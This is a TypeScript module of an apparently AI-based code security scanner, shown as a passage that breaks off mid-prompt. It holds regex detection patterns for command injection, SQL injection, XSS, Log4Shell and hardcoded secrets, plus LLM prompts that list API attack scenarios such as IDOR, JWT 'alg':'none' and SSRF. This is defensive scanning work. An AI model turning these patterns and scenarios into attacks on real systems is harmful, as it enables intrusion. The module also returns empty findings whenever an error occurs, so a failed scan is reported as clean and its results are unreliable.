import type { VulnerabilityReportData, FuzzTarget, ReconFinding, CKGData, CKGNode, CKGEdge, APIFinding } from '../types';
import {
    CKGDataSchema,
    ReconResponseSchema,
    APIResponseSchema,
    FuzzTargetResponseSchema,
    VulnerabilityReportSchema,
    detectPII
} from './schemas';
import { ASTAnalyzer, type SecurityPattern } from './astAnalyzer';
import { JavaScriptFuzzingEngine, generateVulnerabilityFromFuzz, type FuzzResult } from './fuzzingEngine';

// API Configuration - Using secure backend proxy
const API_PROXY_URL = import.meta.env.VITE_API_PROXY_URL || "http://localhost:3001/api/analyze";

console.log("🔧 Module loaded - Using API Proxy:", API_PROXY_URL);

// Helper function to extract JSON from response (handles markdown code blocks)
function extractJSON(text: string): string {
    console.log("🔍 Extracting JSON from response...");
    console.log("📝 Raw response preview:", text.substring(0, 200));
    
    // Remove markdown code blocks if present
    let cleaned = text.trim();
    
    // Pattern 1: ```json ... ```
    if (cleaned.startsWith('```json')) {
        console.log("📦 Found markdown JSON code block, extracting...");
        cleaned = cleaned.replace(/^```json\s*/i, '').replace(/```\s*$/, '');
    }
    // Pattern 2: ``` ... ```
    else if (cleaned.startsWith('```')) {
        console.log("📦 Found markdown code block, extracting...");
        cleaned = cleaned.replace(/^```\s*/, '').replace(/```\s*$/, '');
    }
    
    // Find JSON object boundaries
    const jsonStart = cleaned.indexOf('{');
    const jsonEnd = cleaned.lastIndexOf('}');
    
    if (jsonStart !== -1 && jsonEnd !== -1 && jsonEnd > jsonStart) {
        cleaned = cleaned.substring(jsonStart, jsonEnd + 1);
        console.log("✅ Extracted JSON boundaries successfully");
    }
    
    // Apply comprehensive JSON cleaning
    cleaned = cleanAndFixJSON(cleaned);
    
    return cleaned.trim();
}

// Comprehensive JSON cleaning function
function cleanAndFixJSON(jsonStr: string): string {
    console.log("🧹 Applying comprehensive JSON cleaning...");
    
    let cleaned = jsonStr;
    
    // Step 1: Fix common escape sequence issues
    cleaned = cleaned
        // Fix broken quote escapes that appear as \"
        .replace(/\\"/g, '"')
        // Fix trailing commas in objects and arrays
        .replace(/,(\s*[}\]])/g, '$1')
        // Fix control characters and newlines in strings
        .replace(/[\u0000-\u001F\u007F-\u009F]/g, '')
        // Fix broken escape sequences in the middle of strings
        .replace(/\\(?!["\\/bfnrtu])/g, '')
        // Fix double backslashes that shouldn't be there
        .replace(/\\\\\\\\/g, '\\\\');
    
    // Step 2: Fix malformed string literals
    try {
        // Find string values and clean them individually
        cleaned = cleaned.replace(/"([^"]*?)"/g, (match, content) => {
            // Clean the content inside quotes
            const cleanContent = content
                .replace(/\\/g, '\\\\')  // Escape backslashes
                .replace(/"/g, '\\"')    // Escape quotes
                .replace(/\n/g, '\\n')   // Escape newlines
                .replace(/\r/g, '\\r')   // Escape carriage returns
                .replace(/\t/g, '\\t');  // Escape tabs
            
            return `"${cleanContent}"`;
        });
    } catch (error) {
        console.warn("⚠️ String cleaning failed, using basic cleaning");
    }
    
    // Step 3: Final validation and cleanup
    try {
        // Test parse to see if it's valid
        JSON.parse(cleaned);
        console.log("✅ JSON cleaning successful");
    } catch (error) {
        console.warn("⚠️ JSON still invalid after cleaning, applying fallback cleanup");
        // Fallback: Try to fix common structural issues
        cleaned = cleaned
            .replace(/\n/g, ' ')           // Remove newlines
            .replace(/\r/g, ' ')           // Remove carriage returns
            .replace(/\t/g, ' ')           // Remove tabs
            .replace(/\s+/g, ' ')          // Normalize spaces
            .replace(/,\s*}/g, '}')        // Remove trailing commas in objects
            .replace(/,\s*\]/g, ']');      // Remove trailing commas in arrays
    }
    
    return cleaned;
}

// Helper function to call secure backend API proxy with timeout
async function callMistralAPI(systemPrompt: string, userPrompt: string, responseFormat?: 'json', retryCount = 0): Promise<string> {
    console.log("🔧 callMistralAPI invoked with responseFormat:", responseFormat);
    
    // Check for PII in user prompt before sending
    const piiCheck = detectPII(userPrompt);
    if (piiCheck.found) {
        console.warn("⚠️ PII detected in code:", piiCheck.matches);
        // Continue but log warning - in production, you might want to strip or mask PII
    }

    try {
        console.log("📤 Sending request to API proxy...");
        
        // Add timeout wrapper (300 seconds for Ollama - local models can be very slow with complex prompts)
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 300000); // Increased from 180s to 300s
        
        const response = await fetch(API_PROXY_URL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                systemPrompt,
                userPrompt,
                responseFormat
            }),
            signal: controller.signal
        });

        clearTimeout(timeoutId);
        console.log("📥 Response status:", response.status);

        // Handle rate limiting with exponential backoff
        if (response.status === 429) {
            const MAX_RETRIES = 3;
            if (retryCount < MAX_RETRIES) {
                const waitTime = Math.pow(2, retryCount) * 1000; // 1s, 2s, 4s
                console.warn(`⚠️ Rate limited. Retrying in ${waitTime/1000}s... (Attempt ${retryCount + 1}/${MAX_RETRIES})`);
                await new Promise(resolve => setTimeout(resolve, waitTime));
                return callMistralAPI(systemPrompt, userPrompt, responseFormat, retryCount + 1);
            } else {
                throw new Error(`Mistral API rate limit exceeded. Please wait a moment and try again.`);
            }
        }

        if (!response.ok) {
            const errorData = await response.json();
            console.error("❌ API Error Response:", errorData);
            throw new Error(`API error: ${response.status} - ${errorData.error || 'Unknown error'}`);
        }

        const data = await response.json();
        console.log("✅ Response received successfully");
        
        if (!data.content) {
            console.error("❌ Invalid response structure:", data);
            throw new Error("Invalid response structure from API proxy");
        }
        
        return data.content;
    } catch (error) {
        console.error("❌ API call failed:", error);
        
        // Handle timeout specifically
        if (error instanceof Error && error.name === 'AbortError') {
            throw new Error('API request timed out after 300 seconds. Ollama may be processing a large request or the model is slow. Try reducing the codebase size or using a faster model.');
        }
        
        if (error instanceof Error) {
            throw new Error(`API Error: ${error.message}`);
        }
        throw error;
    }
}

// --- MOCK THREAT INTELLIGENCE FEED ---
const THREAT_INTEL_FEED = [
    { id: 'CVE-2021-44228', pattern: /log4j/i, description: "Log4Shell pattern found." },
    { id: 'CWE-79', pattern: /exec(ute)?\(|eval|innerHTML|document\.write/, description: "Potential Cross-Site Scripting (XSS) sink." },
    { id: 'CWE-89', pattern: /SELECT.*FROM.*WHERE.*=.*'.*[';]/i, description: "Classic SQL Injection pattern detected." },
    { id: 'CWE-78', pattern: /system\(|exec\(|popen\(|shell_exec\(/, description: "OS Command Injection vector detected." },
    { id: 'API_KEY', pattern: /['"][a-zA-Z0-9_]{32,}['"]/, description: "Potential hardcoded high-entropy secret."},
];
// -------------------------------------

const CKG_PROMPT = `# ROLE & EXPERTISE
You are an elite Software Architecture Analyst with 15+ years of experience in reverse engineering complex codebases. Your specialty is constructing high-fidelity Code Knowledge Graphs (CKGs) that reveal attack surfaces and data flow vulnerabilities. You think like both a software architect and an adversary.

# ANALYSIS FRAMEWORK
Apply the following systematic approach:

1. **Architecture Pattern Recognition**: Identify the architectural style (MVC, microservices, serverless, monolith)
2. **Attack Surface Mapping**: Prioritize components that handle external input, authentication, or sensitive data
3. **Data Flow Analysis**: Trace how user input flows through the system to identify potential injection points
4. **Dependency Risk Assessment**: Highlight third-party dependencies with known vulnerabilities
5. **Critical Path Identification**: Focus on execution paths that lead to privileged operations

# COMPONENT PRIORITIZATION (in order of security relevance)
1. Authentication/Authorization functions (highest priority)
2. User input processing functions
3. Database query builders
4. File I/O operations
5. External API integrations
6. Cryptographic operations
7. Session management

# OUTPUT REQUIREMENTS
Generate a **security-focused** Code Knowledge Graph with 5-8 nodes maximum:
- **summary**: 2-3 sentences explaining the codebase architecture, primary attack vectors, and most critical security concerns
- **nodes**: Each node must represent a security-relevant component
  - Use descriptive IDs (e.g., "auth_validator" not "func1")
  - Label should indicate security role (e.g., "JWT Token Validator")
  - Type: Function|Class|File|Dependency|Endpoint
- **edges**: Show data flow from untrusted sources to sensitive operations
  - Prioritize edges showing user-input → processing → data-storage chains

# CRITICAL CONSTRAINTS
- Exclude trivial utility functions (unless they handle security)
- Focus on components where vulnerabilities have highest impact
- If uncertain about component purpose, include it (false negative worse than false positive)
- Ensure every edge references existing node IDs (validate before output)

Return ONLY valid JSON:
{
  "summary": "string",
  "nodes": [{"id": "string", "label": "string", "type": "Function|Class|File|Dependency|Endpoint"}],
  "edges": [{"source": "string", "target": "string"}]
}`;

export async function generateCKG(codebaseSummary: string): Promise<CKGData> {
    const userPrompt = `Codebase Summary:\n---\n${codebaseSummary}\n---`;
    
    try {
        const responseText = await callMistralAPI(CKG_PROMPT, userPrompt, 'json');
        const cleanedJSON = extractJSON(responseText);
        
        // Validate with Zod schema
        const validated = CKGDataSchema.parse(JSON.parse(cleanedJSON));
        const data = validated as CKGData;
        
        // Ensure nodes referenced in edges actually exist
        const nodeIds = new Set(data.nodes.map((n) => n.id));
        data.edges = data.edges.filter((e) => nodeIds.has(e.source) && nodeIds.has(e.target));
        
        return data;
    } catch (error) {
        console.error("Error generating CKG:", error);
        if (error instanceof Error && error.message.includes('ZodError')) {
            throw new Error("AI returned invalid code knowledge graph structure.");
        }
        throw new Error("Failed to generate Code Knowledge Graph from AI.");
    }
}

/**
 * NEW: AST-Enhanced CKG Generation
 * Uses real Abstract Syntax Tree parsing instead of LLM guessing
 * Falls back to LLM if AST parsing fails
 */
export async function generateCKGWithAST(
    codebaseSummary: string,
    codeFiles: Map<string, { code: string; language: string; filename: string }>
): Promise<CKGData> {
    console.log("🔬 Using AST-based analysis (REAL code parsing, not LLM guessing)");
    
    const analyzer = new ASTAnalyzer();
    const allNodes: CKGNode[] = [];
    const allEdges: CKGEdge[] = [];
    const astSuccessCount = { success: 0, failed: 0 };
    
    // First, get accurate structure from AST
    for (const [key, { code, language, filename }] of codeFiles.entries()) {
        try {
            let astResult: CKGData;
            
            // Use unified analyzeCode() method that handles all languages
            if (language.toLowerCase().includes('javascript') || 
                language.toLowerCase().includes('typescript') ||
                language.toLowerCase().includes('python') ||
                language.toLowerCase().includes('java')) {
                astResult = analyzer.analyzeCode(code, filename, language);
                astSuccessCount.success++;
            } else {
                console.log(`⚠️ AST not supported for ${language}, skipping ${filename}`);
                astSuccessCount.failed++;
                continue;
            }
            
            allNodes.push(...astResult.nodes);
            allEdges.push(...astResult.edges);
            
        } catch (error) {
            console.warn(`❌ AST parsing failed for ${filename}:`, error);
            astSuccessCount.failed++;
        }
    }
    
    // Remove duplicate nodes and edges
    const uniqueNodes = Array.from(
        new Map(allNodes.map(n => [n.id, n])).values()
    );
    const uniqueEdges = Array.from(
        new Set(allEdges.map(e => JSON.stringify(e)))
    ).map(s => JSON.parse(s));
    
    console.log(`✅ AST Analysis: ${astSuccessCount.success} files parsed, ${astSuccessCount.failed} failed`);
    
    // If AST found something, use it as primary data
    if (uniqueNodes.length > 0) {
        return {
            summary: `🔬 AST-VERIFIED Analysis: Found ${uniqueNodes.length} functions with ${uniqueEdges.length} real call relationships (parsed from actual code structure, not LLM inference). Accuracy: ${astSuccessCount.success}/${astSuccessCount.success + astSuccessCount.failed} files successfully analyzed.`,
            nodes: uniqueNodes,
            edges: uniqueEdges
        };
    } else {
        // Fall back to LLM if AST completely failed
        console.warn("⚠️ AST analysis found nothing, falling back to LLM");
        return await generateCKG(codebaseSummary);
    }
}

const RECON_PROMPT = `# ROLE & EXPERTISE
You are a Senior Offensive Security Engineer specializing in **automated vulnerability discovery** during the reconnaissance phase. Your expertise spans:
- OSINT and code intelligence gathering
- Pattern-based vulnerability detection (regex, heuristics)
- Threat intelligence correlation
- Configuration security analysis
- Secret/credential exposure detection

# OPERATIONAL MINDSET
Think like an attacker performing **passive reconnaissance**:
- What sensitive information is exposed in the code?
- What configuration weaknesses can be exploited without active probing?
- What patterns suggest vulnerable implementation?
- What hidden endpoints or admin panels might exist?

# ANALYSIS METHODOLOGY
Execute the following scanning procedure:

## 1. SECRET EXPOSURE SCAN
Search for:
- Hardcoded credentials (API keys, passwords, tokens)
- Database connection strings
- Encryption keys / salts
- JWT secrets
- OAuth client secrets
- Private keys (RSA, SSH, SSL certificates)
**Priority**: CRITICAL if found

## 2. EXPOSED PATH DISCOVERY
Identify potentially accessible endpoints:
- Admin panels (/admin, /dashboard, /debug, /config)
- Development endpoints (/test, /dev, /staging)
- Backup files (.bak, .old, ~, .swp)
- Source code exposure (.git, .env, .DS_Store)
- API documentation (/swagger, /api-docs, /graphql)
**Simulate**: gobuster, dirb, dirsearch output

## 3. INSECURE CONFIGURATION DETECTION
Flag dangerous settings:
- Debug mode enabled in production
- Verbose error messages
- Permissive CORS policies
- Disabled security headers
- Default credentials
- Weak encryption algorithms
**Cross-check**: CIS Benchmarks, OWASP standards

## 4. VULNERABLE CODE PATTERN MATCHING
Detect anti-patterns indicating vulnerabilities:
- SQL query concatenation (not parameterized)
- Command execution with user input
- Eval/exec usage
- Unsafe deserialization
- Regex DoS patterns
- XXE-prone XML parsing
**Match**: MITRE CWE patterns, SANS Top 25

## 5. THREAT INTELLIGENCE CORRELATION
**MANDATORY**: Cross-reference ALL findings with the Threat Intelligence Feed:
- If pattern matches feed, include 'threatIntelMatch' field
- Prioritize CVE-matched findings as CRITICAL
- Note: Log4Shell (CVE-2021-44228) is highest priority

# OUTPUT SPECIFICATION
For each finding, provide:
- **category**: Must be one of: Hardcoded Secret | Exposed Path | Insecure Configuration | Vulnerable Pattern | Threat Intel Match
- **description**: Precise technical explanation with code location/pattern
- **recommendation**: Specific remediation steps (not generic advice)
- **threatIntelMatch**: CVE/CWE ID if matched (e.g., "CVE-2021-44228")

# SEVERITY GUIDELINES
- Hardcoded admin credentials → CRITICAL
- CVE matches → CRITICAL
- Exposed admin panels → HIGH
- Debug mode enabled → MEDIUM
- Weak configs → MEDIUM-LOW

# QUALITY CONTROL
- Zero false positives: Only report high-confidence findings
- Provide exploitability context, not just pattern detection
- If no vulnerabilities found, return empty array (don't fabricate)

Return ONLY valid JSON:
{
  "findings": [
    {
      "category": "Hardcoded Secret|Exposed Path|Insecure Configuration|Vulnerable Pattern|Threat Intel Match",
      "description": "string",
      "recommendation": "string",
      "threatIntelMatch": "string (optional)"
    }
  ]
}`;

export async function performReconnaissanceAnalysis(codebaseSummary: string): Promise<ReconFinding[]> {
    console.log("🔍 performReconnaissanceAnalysis called");
    console.log("📝 Codebase summary length:", codebaseSummary.length);
    
    const threatIntelText = THREAT_INTEL_FEED.map(t => `- ID: ${t.id}, Pattern: ${t.pattern.toString()}, Description: ${t.description}`).join('\n');
    const userPrompt = `Threat Intelligence Feed (for cross-referencing):\n---\n${threatIntelText}\n---\n\nCodebase Summary:\n---\n${codebaseSummary}\n---\n\nReturn a list of findings. If no issues are found, return an empty list.`;
    
    console.log("📤 About to call API...");
    
    try {
        const responseText = await callMistralAPI(RECON_PROMPT, userPrompt, 'json');
        console.log("📥 Raw response text:", responseText.substring(0, 200) + "...");
        
        // Extract and clean JSON (handles markdown code blocks and malformed content)
        let cleanedJSON = extractJSON(responseText);
        console.log("🧹 Cleaned JSON (first 500 chars):", cleanedJSON.substring(0, 500) + "...");
        
        // Try to parse with validation
        let validated;
        let parseAttempts = 0;
        const maxAttempts = 3;
        
        while (parseAttempts < maxAttempts) {
            try {
                parseAttempts++;
                console.log(`🔄 JSON Parse attempt ${parseAttempts}/${maxAttempts}`);
                
                const parsedData = JSON.parse(cleanedJSON);
                
                // Preprocess the data to fix common AI response issues
                if (parsedData.findings && Array.isArray(parsedData.findings)) {
                    parsedData.findings = parsedData.findings.map((finding: any) => {
                        // Map invalid categories to valid ones
                        const categoryMap: Record<string, string> = {
                            'Insecure Password Storage': 'Insecure Configuration',
                            'Insecure Cryptographic Operations': 'Vulnerable Pattern',
                            'Cryptographic Vulnerability': 'Vulnerable Pattern',
                            'Security Vulnerability': 'Vulnerable Pattern',
                            'Information Disclosure': 'Exposed Path',
                            'Hardcoded Secrets': 'Hardcoded Secret',
                            'Secret Exposure': 'Hardcoded Secret',
                            'Path Exposure': 'Exposed Path',
                            'Configuration Issue': 'Insecure Configuration'
                        };
                        
                        return {
                            // Ensure threatIntelMatch is either string or undefined (not null)
                            threatIntelMatch: finding.threatIntelMatch === null ? undefined : finding.threatIntelMatch,
                            // Map category to valid value or use default
                            category: categoryMap[finding.category] || finding.category || 'Vulnerable Pattern',
                            description: finding.description || 'Unknown vulnerability detected',
                            recommendation: finding.recommendation || 'Review and remediate this finding'
                        };
                    });
                }
                
                validated = ReconResponseSchema.parse(parsedData);
                console.log("✅ JSON parsed and validated successfully");
                break;
                
            } catch (parseError) {
                console.warn(`⚠️ Parse attempt ${parseAttempts} failed:`, parseError instanceof Error ? parseError.message : parseError);
                
                if (parseAttempts < maxAttempts) {
                    // Try more aggressive cleaning for next attempt
                    console.log("🔧 Applying more aggressive JSON cleaning...");
                    
                    // Progressive cleaning strategies
                    if (parseAttempts === 1) {
                        // Attempt 2: Fix specific patterns found in the error
                        cleanedJSON = cleanedJSON
                            .replace(/Hardcoded Secret\\",\\"/g, 'Hardcoded Secret","')
                            .replace(/Insecure Configuration\\",\\"/g, 'Insecure Configuration","')
                            .replace(/\\",\s*\\"/g, '","')
                            .replace(/\\"/g, '"');
                    } else if (parseAttempts === 2) {
                        // Attempt 3: Rebuild JSON structure
                        try {
                            // Extract just the findings array content and rebuild
                            const findingsMatch = cleanedJSON.match(/"findings":\s*\[(.*)\]/s);
                            if (findingsMatch) {
                                const findingsContent = findingsMatch[1];
                                cleanedJSON = `{"findings":[${findingsContent}]}`;
                            }
                        } catch (rebuildError) {
                            console.warn("⚠️ JSON rebuild failed:", rebuildError);
                        }
                    }
                } else {
                    // All attempts failed
                    console.error("❌ All JSON parsing attempts failed");
                    console.error("Final cleaned JSON:", cleanedJSON.substring(0, 1000));
                    
                    // Return empty findings instead of throwing
                    console.log("🔄 Returning empty findings due to parsing failure");
                    return [];
                }
            }
        }
        
        if (!validated) {
            console.log("🔄 JSON parsing completely failed, returning empty findings");
            return [];
        }
        
        console.log("✅ Reconnaissance analysis completed successfully");
        return (validated.findings || []) as ReconFinding[];
        
    } catch (error) {
        console.error("❌ Error in performReconnaissanceAnalysis:", error);
        
        // Handle specific error types
        if (error instanceof Error) {
            if (error.message.includes('timed out')) {
                throw new Error("Analysis timed out. The AI model may be overloaded. Please try again in a moment.");
            } else if (error.message.includes('ZodError')) {
                console.log("🔄 Schema validation failed, returning empty findings");
                return [];
            } else if (error.message.includes('AbortError')) {
                throw new Error("Analysis was cancelled due to timeout. Please try again.");
            }
        }
        
        // For any other error, return empty findings instead of failing completely
        console.log("🔄 Unexpected error occurred, returning empty findings");
        return [];
    }
}

const API_SECURITY_PROMPT = `# ROLE & EXPERTISE
You are a **Principal API Security Architect** with OWASP API Security Top 10 certification and 10+ years of experience securing RESTful, GraphQL, and gRPC APIs. You've personally discovered critical vulnerabilities in Fortune 500 APIs. Your analysis has prevented data breaches affecting millions of users.

# SPECIALIZED KNOWLEDGE
You possess deep expertise in:
- IDOR (Insecure Direct Object Reference) exploitation
- JWT/OAuth 2.0 authentication bypass
- GraphQL introspection abuse
- API rate limiting bypass
- NoSQL injection via API parameters
- SSRF through webhook/callback URLs
- Mass assignment vulnerabilities
- API versioning security issues

# OWASP API SECURITY TOP 10:2023 - EXPLOITATION SCENARIOS

## API1:2023 - Broken Object Level Authorization (BOLA/IDOR)
**Attack Vector**: Manipulate object IDs in API endpoints
**Examples**:
- /api/users/{user_id} without ownership validation
- /api/orders/{order_id}/invoice accessible by any authenticated user
- DELETE /api/documents/{doc_id} without permission check
**Detection**: Look for ID parameters with no authorization logic

## API2:2023 - Broken Authentication
**Attack Vector**: Bypass or compromise authentication
**Examples**:
- JWT tokens with "alg":"none" accepted
- Predictable session tokens
- No token expiration
- Password reset tokens reusable
- OAuth redirect_uri validation missing
**Detection**: Authentication logic bypasses, weak token generation

## API3:2023 - Broken Object Property Level Authorization
**Attack Vector**: Mass assignment + excessive data exposure
**Examples**:
- PATCH /api/users/{id} allows modifying "isAdmin" field
- GET /api/users returns passwords/tokens in response
- GraphQL queries return all fields without filtering
**Detection**: User-controlled fields affecting privileges, over-fetching

## API4:2023 - Unrestricted Resource Consumption
**Attack Vector**: Exhaust server resources
**Examples**:
- No rate limiting on expensive operations
- File upload without size limits
- Pagination without max limit
- Recursive API calls allowed
**Detection**: Missing rate limits, unbounded operations

## API5:2023 - Broken Function Level Authorization
**Attack Vector**: Access admin functions as regular user
**Examples**:
- POST /api/admin/users accessible by non-admin
- Hidden endpoints like /api/internal/debug
- HTTP method bypass (GET to POST)
**Detection**: Admin endpoints without role checks

## API6:2023 - Unrestricted Access to Sensitive Business Flows
**Attack Vector**: Abuse business logic
**Examples**:
- Ticket scalping via rapid API purchases
- Vote manipulation (no rate limit)
- Referral bonus abuse
**Detection**: Business-critical flows without anti-automation

## API7:2023 - Server-Side Request Forgery (SSRF)
**Attack Vector**: Make API fetch attacker-controlled URLs
**Examples**:
- /api/fetch?url=http://internal-service/
- Webhook URLs pointing to internal IPs
- XML external entity attacks
**Detection**: User-supplied URLs processed by server

## API8:2023 - Security Misconfiguration
**Attack Vector**: Exploit default/weak configurations
**Examples**:
- CORS: Access-Control-Allow-Origin: *
- Stack traces in error responses
- Unnecessary HTTP methods enabled (TRACE, OPTIONS)
- TLS 1.0 enabled
**Detection**: Dangerous headers, verbose errors, weak crypto

## API9:2023 - Improper Inventory Management
**Attack Vector**: Exploit forgotten/deprecated APIs
**Examples**:
- Old API versions still accessible (/v1/)
- Beta endpoints in production
- Shadow APIs (undocumented)
**Detection**: Multiple versions, unmanaged endpoints

## API10:2023 - Unsafe Consumption of APIs
**Attack Vector**: Trust third-party APIs without validation
**Examples**:
- Forwarding external API responses to users
- No input validation on third-party data
- Following redirects blindly
**Detection**: External API calls without sanitization

# ANALYSIS FRAMEWORK
For each potential vulnerability:
1. **Identify**: Match code patterns to OWASP categories
2. **Severity**: Assign based on exploitability + impact (use CVSS thinking)
3. **Exploit Scenario**: Explain how attacker would exploit this
4. **Business Impact**: What data/functionality is compromised?
5. **Remediation**: Provide specific code-level fix

# SEVERITY CLASSIFICATION
- **Critical**: RCE, Auth bypass, PII exposure, Financial fraud
- **High**: IDOR, Privilege escalation, Data manipulation
- **Medium**: SSRF (internal network), Information disclosure
- **Low**: Configuration warnings, Missing headers

# OUTPUT REQUIREMENTS
- Focus on **exploitable** vulnerabilities, not theoretical risks
- Provide specific API endpoint examples
- Prioritize findings that could lead to data breach
- If API code not present in codebase, return empty array
- Never assume vulnerabilities without evidence

Return ONLY valid JSON:
{
  "findings": [
    {
      "category": "BOLA|Broken Authentication|Broken Object Property|Resource Consumption|Broken Function Level|Business Flow|SSRF|Security Misconfiguration|Inventory Management|Unsafe Consumption",
      "description": "string (include endpoint path, parameter name, exploit scenario)",
      "severity": "Critical|High|Medium|Low",
      "recommendation": "string (specific code fix, not generic advice)"
    }
  ]
}`;

export async function performAPISecurityAnalysis(codebaseSummary: string): Promise<APIFinding[]> {
    console.log("🛡️ performAPISecurityAnalysis called");
    console.log("📝 Codebase summary length:", codebaseSummary.length);
    
    const userPrompt = `Codebase Summary:\n---\n${codebaseSummary}\n---\n\nReturn a list of API security findings. If no issues are found, return an empty list.`;
    
    console.log("📤 About to call API for API Security analysis...");
    
    try {
        const responseText = await callMistralAPI(API_SECURITY_PROMPT, userPrompt, 'json');
        console.log("📥 Raw API Security response:", responseText.substring(0, 200) + "...");
        
        // Extract and clean JSON with the same robust handling as reconnaissance
        let cleanedJSON = extractJSON(responseText);
        console.log("🧹 Cleaned JSON (first 500 chars):", cleanedJSON.substring(0, 500) + "...");
        
        // Try to parse with validation using the same robust approach
        let validated;
        let parseAttempts = 0;
        const maxAttempts = 3;
        
        while (parseAttempts < maxAttempts) {
            try {
                parseAttempts++;
                console.log(`🔄 API Security JSON Parse attempt ${parseAttempts}/${maxAttempts}`);
                
                const parsedData = JSON.parse(cleanedJSON);
                
                // Preprocess the data to fix common AI response issues for API Security
                if (parsedData.findings && Array.isArray(parsedData.findings)) {
                    parsedData.findings = parsedData.findings.map((finding: any) => ({
                        ...finding,
                        // Ensure all required fields exist with defaults
                        category: finding.category || 'Security Misconfiguration',
                        description: finding.description || 'Unknown API security issue detected',
                        severity: finding.severity || 'Medium',
                        recommendation: finding.recommendation || 'Review and remediate this API security finding'
                    }));
                }
                
                validated = APIResponseSchema.parse(parsedData);
                console.log("✅ API Security JSON parsed and validated successfully");
                break;
                
            } catch (parseError) {
                console.warn(`⚠️ API Security parse attempt ${parseAttempts} failed:`, parseError instanceof Error ? parseError.message : parseError);
                
                if (parseAttempts < maxAttempts) {
                    // Apply the same progressive cleaning strategies
                    console.log("🔧 Applying more aggressive JSON cleaning for API Security...");
                    
                    if (parseAttempts === 1) {
                        // Attempt 2: Fix specific patterns
                        cleanedJSON = cleanedJSON
                            .replace(/BOLA\\",\\"/g, 'BOLA","')
                            .replace(/Broken Authentication\\",\\"/g, 'Broken Authentication","')
                            .replace(/Security Misconfiguration\\",\\"/g, 'Security Misconfiguration","')
                            .replace(/\\",\s*\\"/g, '","')
                            .replace(/\\"/g, '"');
                    } else if (parseAttempts === 2) {
                        // Attempt 3: Rebuild JSON structure
                        try {
                            const findingsMatch = cleanedJSON.match(/"findings":\s*\[(.*)\]/s);
                            if (findingsMatch) {
                                const findingsContent = findingsMatch[1];
                                cleanedJSON = `{"findings":[${findingsContent}]}`;
                            }
                        } catch (rebuildError) {
                            console.warn("⚠️ API Security JSON rebuild failed:", rebuildError);
                        }
                    }
                } else {
                    // All attempts failed
                    console.error("❌ All API Security JSON parsing attempts failed");
                    console.error("Final cleaned JSON:", cleanedJSON.substring(0, 1000));
                    
                    // Return empty findings instead of throwing
                    console.log("🔄 Returning empty API Security findings due to parsing failure");
                    return [];
                }
            }
        }
        
        if (!validated) {
            console.log("🔄 API Security JSON parsing completely failed, returning empty findings");
            return [];
        }
        
        console.log("✅ API Security analysis completed successfully");
        return (validated.findings || []) as APIFinding[];
        
    } catch (error) {
        console.error("❌ Error in performAPISecurityAnalysis:", error);
        
        // Handle specific error types with the same approach
        if (error instanceof Error) {
            if (error.message.includes('timed out')) {
                throw new Error("API Security analysis timed out. The AI model may be overloaded. Please try again in a moment.");
            } else if (error.message.includes('ZodError')) {
                console.log("🔄 API Security schema validation failed, returning empty findings");
                return [];
            } else if (error.message.includes('AbortError')) {
                throw new Error("API Security analysis was cancelled due to timeout. Please try again.");
            }
        }
        
        // For any other error, return empty findings instead of failing completely
        console.log("🔄 Unexpected API Security error occurred, returning empty findings");
        return [];
    }
}

const TARGET_PROMPT = `# ROLE & EXPERTISE
You are a **Lead Fuzzing Engineer**, formerly with Google Project Zero, with 8+ years of experience designing coverage-guided fuzzing campaigns. You've discovered critical 0-days in Chrome, OpenSSL, and Linux kernel. Your specialty is identifying high-value attack surfaces where fuzzing yields maximum security ROI.

# CORE COMPETENCIES
- AFL++ harness design
- LibFuzzer instrumentation
- Crash triaging and root cause analysis
- Sanitizer interpretation (ASan, MSan, UBSan)
- Coverage analysis and seed corpus optimization
- State machine fuzzing (protocol parsers)

# TARGET SELECTION PHILOSOPHY
**Not all functions are created equal.** Prioritize functions where:
1. **Untrusted data enters** (parsing, deserialization, decompression)
2. **Complexity is high** (loops, recursion, state machines)
3. **Impact is severe** (memory operations, privilege boundaries)

# 3-PHASE TARGET IDENTIFICATION FRAMEWORK

## PHASE 1: Input Surface Analysis
Scan for functions that:
- Parse external data (JSON, XML, protocol buffers, binary formats)
- Decompress/decrypt data (gzip, base64, AES)
- Deserialize objects (pickle, YAML, msgpack)
- Validate user input (regex matching, schema validation)
- Handle file uploads (image processing, PDF parsing)

## PHASE 2: Complexity Scoring
Calculate risk based on:
- **Cyclomatic Complexity**: >15 = high priority target
- **Loop Depth**: Nested loops = good fuzzing candidates
- **Recursion**: Recursive functions often have edge cases
- **State Machines**: Protocol handlers with multiple states
- **String Operations**: Lots of strcpy/strcat/sprintf (C/C++)

## PHASE 3: Impact Assessment
Prioritize functions that:
- Operate on memory (malloc, realloc, memcpy, pointer arithmetic)
- Execute system commands (exec, system, popen)
- Handle authentication/authorization
- Cross privilege boundaries (setuid, capability checks)
- Interface with kernel (syscalls, ioctl)

# LANGUAGE-SPECIFIC PRIORITIES

## C/C++ Targets
1. **Buffer operations**: strcpy, memcpy, sprintf
2. **Integer arithmetic**: Risk of overflow/underflow
3. **Pointer arithmetic**: Array indexing, pointer casting
4. **Memory allocation**: Custom allocators

## JavaScript/TypeScript Targets
1. **Type coercion**: Functions mixing types
2. **Prototype pollution**: Object manipulation
3. **eval() usage**: Dynamic code execution
4. **Regular expressions**: ReDoS potential

## Python Targets
1. **pickle/yaml.load**: Deserialization gadgets
2. **subprocess.call with shell=True**: Command injection
3. **SQL string concatenation**: SQLi potential
4. **File path operations**: Path traversal

## Java Targets
1. **Serialization**: ObjectInputStream usage
2. **XML parsing**: XXE vulnerabilities
3. **Reflection**: Dynamic class loading
4. **JNDI lookups**: Log4Shell-style attacks

# PRIORITIZATION SCORING (1-10)
- **10/10**: Parser functions (binary, protocol, structured data)
- **9/10**: Cryptographic operations (custom crypto, key derivation)
- **9/10**: Memory-unsafe operations (C/C++ buffer handling)
- **8/10**: Deserialization (any format)
- **8/10**: File I/O with complex formats (images, PDFs, archives)
- **7/10**: Network protocol handlers
- **6/10**: Regular expression matching (ReDoS)
- **5/10**: String validation functions

# OUTPUT REQUIREMENTS
- Identify **exactly 3 functions** (most critical targets)
- For each function:
  - Provide exact **functionName** from CKG
  - Explain **reasoning** (why it's a high-value target - input type, complexity, impact)
  - Infer **language** from code patterns
- If codebase has <3 fuzzable functions, return what's available
- Prioritize **remotely triggerable** functions over local-only

# CRITICAL CONSTRAINTS
- Never select simple getters/setters or trivial utility functions
- Avoid functions with no external input
- Focus on **attack surface** visible to unauthenticated/low-privilege users
- If no suitable targets found, return empty array

Return ONLY valid JSON:
{
